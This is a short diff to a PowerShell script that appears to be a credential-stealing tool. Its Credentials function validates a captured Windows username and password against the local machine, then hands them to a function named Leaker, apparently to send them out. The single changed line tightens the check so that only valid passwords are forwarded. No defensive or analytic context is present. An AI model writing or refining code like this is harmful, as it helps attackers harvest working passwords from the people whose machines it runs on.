@@ -65,7 +65,7 @@ function Credentials(){
             if ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain -eq $false -and ((Get-WmiObject -Class Win32_ComputerSystem).Workgroup -eq "WORKGROUP") -or (Get-WmiObject -Class Win32_ComputerSystem).Workgroup -ne $null){
                 $domain = "WORKGROUP"
                 $workgroup_creds = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$ComputerName)
-                if ($workgroup_creds.ValidateCredentials($UserName, $Password) -ne $null){
+                if ($workgroup_creds.ValidateCredentials($UserName, $Password) -eq $true){
                     Leaker($domain,$Username,$Password)
                     $status = $false
                     exit
